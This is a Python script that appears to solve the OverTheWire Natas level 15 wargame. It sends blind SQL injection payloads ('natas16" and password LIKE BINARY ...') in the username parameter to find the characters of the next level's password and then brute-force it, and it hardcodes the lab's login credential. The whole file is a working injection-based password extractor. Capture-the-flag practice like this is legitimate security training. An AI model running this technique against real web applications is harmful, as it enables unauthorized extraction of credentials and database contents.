#!/bin/python
import requests,string

url = "http://natas15.natas.labs.overthewire.org"
username = "natas15"
password = "TTkaI7AWG4iDERztBcEyKV7kRXH1EZRB"

chars = ''.join([string.ascii_letters,string.digits])

passwd_dic = []
valid_str = "This user exists."
for char in chars:
    uri = ''.join([url,'?','username=natas16"','+and+password+LIKE+BINARY+"%',char,'%','&debug'])
    r = requests.get(uri, auth=(username,password))
    if valid_str in r.text:
        passwd_dic.append(char)
        print("Password Dictionary: {0}".format(''.join(passwd_dic)))
print("Dictionary build complete.")
print("Dictionary: {0}".format(''.join(passwd_dic)))
print("Dictionary: {0}".format(''.join(passwd_dic)))

#Status
print("Now attempting to brute force...")
passwd_list = []
pass2 = ''
for i in range(1,64):
    for char in passwd_dic:
        test = ''.join([pass2,char])
        uri = ''.join([url,'?','username=natas16"','+and+password+LIKE+BINARY+"',test,'%','&debug'])
        
        r = requests.get(uri, auth=(username,password))
        
        if valid_str in r.text:
            passwd_list.append(char)
            pass2 = ''.join(passwd_list)
            print("Lenght: {0}, Password: {1}".format(len(pass2),pass2))
